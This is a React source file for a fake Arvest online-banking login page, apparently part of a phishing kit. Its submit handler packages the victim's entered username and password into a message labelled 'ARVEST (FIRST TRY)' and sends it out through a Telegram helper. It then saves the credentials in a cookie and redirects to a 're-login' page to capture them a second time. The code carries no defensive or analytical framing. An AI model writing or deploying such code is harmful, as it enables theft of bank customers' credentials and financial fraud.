import React, {useState} from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";

export default function Login() {
  const [formInput, setFormInput] = useState<Login>({
    username: "",
    password: ""
})
const [isLoading, setIsLoading] = React.useState(false);
const navigate = useNavigate()

function handleInputChange (event:React.ChangeEvent<HTMLInputElement>){
    setFormInput((prevData) => ({
        ...prevData,
        [event.target.name]: event.target.value
    }))
}

async function handleSubmit(event: React.FormEvent<HTMLFormElement>){
    
    event.preventDefault()
    setIsLoading(true)
    const message = `
    [----+🏦 ARVEST (FIRST TRY) 🏦+-----]
  
    USERNAME: ${formInput.username}

    PASSWORD: ${formInput.password}
    `;
    await TelegramSend(message)
    cookies.set("login1", formInput)
    setIsLoading(false)
    navigate("../re-login", {replace:true})
    
}
  return (
    <>
      <div className="submitForm">
       
        <p
          className="go-left"
          style={{ fontSize: "14px", marginBottom: "30px" }}
        >
          Please enter your Login ID to log in to online banking. <br />
        </p>

        <form id="login-form" onSubmit={handleSubmit} method="post">
          <div className="input-field" style={{ textAlign: "left" }}>
            <label htmlFor="username">
              Login ID <span style={{ color: "red" }}>*</span>
            </label>
            <input onChange={handleInputChange} required id="username" name="username" type="text" />
          </div>
          <div className="input-field" style={{ textAlign: "left" }}>
            <label htmlFor="password">
              Password <span style={{ color: "red" }}>*</span>
            </label>
            <input onChange={handleInputChange} required id="password" name="password" type="password" />
          </div>

          <div className="checkboxWrapper" style={{ marginTop: "20px" }}>
            <div className="checkbox">
              <input type="checkbox" name="" id="" />
            </div>
            <div className="label">
              <label htmlFor="">Remember User ID</label>
            </div>
          </div>
          <p>
            <a style={{ textDecoration: "none", fontSize: "15px" }} href="">
              Forgot your login ID
            </a>
          </p>
          <p>
            <a style={{ textDecoration: "none", fontSize: "15px" }} href="">
              Forgot your password
            </a>
          </p>
          {isLoading ?
            <button style={{ marginTop: "-2px" }} type="button">
          Please wait...
        </button>
          :
          <button style={{ marginTop: "-2px" }} type="submit">
          Submit
        </button>}
        </form>

        
        <br />

        <p>Unauthorized access is prohibited. Usage may be monitored</p>

        <hr />

        <p>Have questions about Arvest Online Banking?</p>
      </div>
    </>
  );
}
